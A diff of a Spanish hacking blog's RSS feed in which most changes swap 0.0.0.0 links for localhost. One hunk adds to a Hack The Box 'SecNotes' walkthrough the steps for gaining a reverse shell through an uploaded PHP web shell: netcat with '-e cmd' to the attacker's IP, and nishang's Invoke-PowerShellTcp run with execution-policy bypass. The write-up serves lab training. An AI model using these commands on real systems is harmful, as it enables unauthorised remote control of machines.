@@ -3,8 +3,8 @@
   <channel>
     <title>Filthy Hacker</title>
     <description>Filthy Hacker es un blog dedicado al hacking. ¿Te apasiona la ciberseguridad, o quieres aprender? ¡Este es el lugar! Resolución de máquinas, explicación de vulnerabilidades, CTF's y varias temáticas relacionadas al hacking.</description>
-    <link>http://0.0.0.0:8080</link>
-    <atom:link href="http://0.0.0.0:8080/feed.xml" rel="self" type="application/rss+xml" />
+    <link>http://localhost:8080</link>
+    <atom:link href="http://localhost:8080/feed.xml" rel="self" type="application/rss+xml" />
     <author>
       <name>m4teo</name>
       <email>mandinoparedes@hotmail.com</email>
@@ -405,19 +405,61 @@ get iisstart.png
 
 &lt;p&gt;Una vez subida, desde nuestro navegador, podemos acceder a ella añadiendo &lt;em&gt;/cmd.php?cmd=comando&lt;/em&gt; al url.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/32.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
 &lt;p&gt;Podemos ejecutar &lt;em&gt;ipconfig&lt;/em&gt; para corroborar que nos encontramos dentro de la máquina víctima.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/33.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/32.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;O &lt;em&gt;whoami&lt;/em&gt; para determinar que usuario somos.&lt;/p&gt;
 
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/33.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ya a partir de este punto, lo que nos interesa como atacantes, es ganar acceso al sistema a través de una consola propiamente, para lo cual tenemos dos opciones:&lt;/p&gt;
+
+&lt;p&gt;Podemos usar &lt;a href=&quot;https://eternallybored.org/misc/netcat/&quot;&gt;Netcat&lt;/a&gt;, para lo cual descargaremos la última versión, subiremos al servidor web la versión compilada para 64 bits.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;put nc64.exe
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/34.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nos pondremos en escucha a través del puerto que determinemos.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo rlwrap nc -nlvp &amp;lt;puertoCualquiera&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Para finalmente a través del navegador añadir lo siguiente al url.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/cmd.php?cmd=nc64.exe -e cmd &amp;lt;nuestraDirecciónIP&amp;gt; &amp;lt;puertoCualquiera&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/35.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
+&lt;p&gt;O por su parte podemos usar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Invoke-PowerShellTcp&lt;/code&gt; de &lt;em&gt;nishang&lt;/em&gt;, para lo cual descargaremos el script.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Añadimos lo siguiente al final del script.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Invoke-PowerShellTcp -Reverse -IPAddress &amp;lt;nuestraDirecciónIP&amp;gt; -Port &amp;lt;puertoCualquiera&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Lo subimos al servidor web.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;put Invoke-PowerShellTcp.ps1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/36.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nos ponemos en escucha a través del puerto que determinamos anteriormente.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo rlwrap nc -nlvp &amp;lt;puertoCualquiera&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Para finalmente a través del navegador añadir lo siguiente al url.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/cmd.php?cmd=powershell -ep bypass .\Invoke-PowerShellTcp
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/37.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
@@ -440,9 +482,9 @@ get iisstart.png
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/45.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 </description>
         <pubDate>Mon, 28 Feb 2022 00:00:00 -0500</pubDate>
-        <link>http://0.0.0.0:8080//SecNotes-Hack-The-Box</link>
-        <link href="http://0.0.0.0:8080/SecNotes-Hack-The-Box"/>
-        <guid isPermaLink="true">http://0.0.0.0:8080/SecNotes-Hack-The-Box</guid>
+        <link>http://localhost:8080//SecNotes-Hack-The-Box</link>
+        <link href="http://localhost:8080/SecNotes-Hack-The-Box"/>
+        <guid isPermaLink="true">http://localhost:8080/SecNotes-Hack-The-Box</guid>
       </item>
     
       <item>
@@ -732,9 +774,9 @@ export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PATH&lt;/span&gt;&lt;span c
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-07-Kenobi-TryHackMe/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 </description>
         <pubDate>Mon, 07 Feb 2022 00:00:00 -0500</pubDate>
-        <link>http://0.0.0.0:8080//Kenobi-TryHackMe</link>
-        <link href="http://0.0.0.0:8080/Kenobi-TryHackMe"/>
-        <guid isPermaLink="true">http://0.0.0.0:8080/Kenobi-TryHackMe</guid>
+        <link>http://localhost:8080//Kenobi-TryHackMe</link>
+        <link href="http://localhost:8080/Kenobi-TryHackMe"/>
+        <guid isPermaLink="true">http://localhost:8080/Kenobi-TryHackMe</guid>
       </item>
     
       <item>
@@ -1212,9 +1254,9 @@ XzFOajNDN2kwbn0=
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/61.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 </description>
         <pubDate>Mon, 17 Jan 2022 00:00:00 -0500</pubDate>
-        <link>http://0.0.0.0:8080//KnightCTF-2022</link>
-        <link href="http://0.0.0.0:8080/KnightCTF-2022"/>
-        <guid isPermaLink="true">http://0.0.0.0:8080/KnightCTF-2022</guid>
+        <link>http://localhost:8080//KnightCTF-2022</link>
+        <link href="http://localhost:8080/KnightCTF-2022"/>
+        <guid isPermaLink="true">http://localhost:8080/KnightCTF-2022</guid>
       </item>
     
       <item>
@@ -1744,9 +1786,9 @@ ssh-keygen
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/40.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 </description>
         <pubDate>Mon, 27 Dec 2021 00:00:00 -0500</pubDate>
-        <link>http://0.0.0.0:8080//Safe-Hack-The-Box</link>
-        <link href="http://0.0.0.0:8080/Safe-Hack-The-Box"/>
-        <guid isPermaLink="true">http://0.0.0.0:8080/Safe-Hack-The-Box</guid>
+        <link>http://localhost:8080//Safe-Hack-The-Box</link>
+        <link href="http://localhost:8080/Safe-Hack-The-Box"/>
+        <guid isPermaLink="true">http://localhost:8080/Safe-Hack-The-Box</guid>
       </item>
     
       <item>
@@ -2111,9 +2153,9 @@ ssh-keygen
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/35.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 </description>
         <pubDate>Mon, 06 Dec 2021 00:00:00 -0500</pubDate>
-        <link>http://0.0.0.0:8080//Beep-Hack-The-Box</link>
-        <link href="http://0.0.0.0:8080/Beep-Hack-The-Box"/>
-        <guid isPermaLink="true">http://0.0.0.0:8080/Beep-Hack-The-Box</guid>
+        <link>http://localhost:8080//Beep-Hack-The-Box</link>
+        <link href="http://localhost:8080/Beep-Hack-The-Box"/>
+        <guid isPermaLink="true">http://localhost:8080/Beep-Hack-The-Box</guid>
       </item>
     
       <item>
@@ -2401,9 +2443,9 @@ type flag3.txt
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 </description>
         <pubDate>Mon, 15 Nov 2021 00:00:00 -0500</pubDate>
-        <link>http://0.0.0.0:8080//Blue-TryHackMe</link>
-        <link href="http://0.0.0.0:8080/Blue-TryHackMe"/>
-        <guid isPermaLink="true">http://0.0.0.0:8080/Blue-TryHackMe</guid>
+        <link>http://localhost:8080//Blue-TryHackMe</link>
+        <link href="http://localhost:8080/Blue-TryHackMe"/>
+        <guid isPermaLink="true">http://localhost:8080/Blue-TryHackMe</guid>
       </item>
     
       <item>
@@ -2757,9 +2799,9 @@ WantedBy=multi-user.target'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-25-Vulnversity-TryHackMe/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 </description>
         <pubDate>Mon, 25 Oct 2021 00:00:00 -0400</pubDate>
-        <link>http://0.0.0.0:8080//Vulnversity-TryHackMe</link>
-        <link href="http://0.0.0.0:8080/Vulnversity-TryHackMe"/>
-        <guid isPermaLink="true">http://0.0.0.0:8080/Vulnversity-TryHackMe</guid>
+        <link>http://localhost:8080//Vulnversity-TryHackMe</link>
+        <link href="http://localhost:8080/Vulnversity-TryHackMe"/>
+        <guid isPermaLink="true">http://localhost:8080/Vulnversity-TryHackMe</guid>
       </item>
     
       <item>
@@ -3004,9 +3046,9 @@ su root
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-04-Explore-Hack-The-Box/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 </description>
         <pubDate>Mon, 04 Oct 2021 00:00:00 -0400</pubDate>
-        <link>http://0.0.0.0:8080//Explore-Hack-The-Box</link>
-        <link href="http://0.0.0.0:8080/Explore-Hack-The-Box"/>
-        <guid isPermaLink="true">http://0.0.0.0:8080/Explore-Hack-The-Box</guid>
+        <link>http://localhost:8080//Explore-Hack-The-Box</link>
+        <link href="http://localhost:8080/Explore-Hack-The-Box"/>
+        <guid isPermaLink="true">http://localhost:8080/Explore-Hack-The-Box</guid>
       </item>
     
       <item>
@@ -3103,9 +3145,9 @@ su root
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-13-Local-File-Inclusion-(LFI)/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 </description>
         <pubDate>Mon, 13 Sep 2021 00:00:00 -0400</pubDate>
-        <link>http://0.0.0.0:8080//Local-File-Inclusion-(LFI)</link>
-        <link href="http://0.0.0.0:8080/Local-File-Inclusion-(LFI)"/>
-        <guid isPermaLink="true">http://0.0.0.0:8080/Local-File-Inclusion-(LFI)</guid>
+        <link>http://localhost:8080//Local-File-Inclusion-(LFI)</link>
+        <link href="http://localhost:8080/Local-File-Inclusion-(LFI)"/>
+        <guid isPermaLink="true">http://localhost:8080/Local-File-Inclusion-(LFI)</guid>
       </item>
     
   </channel>
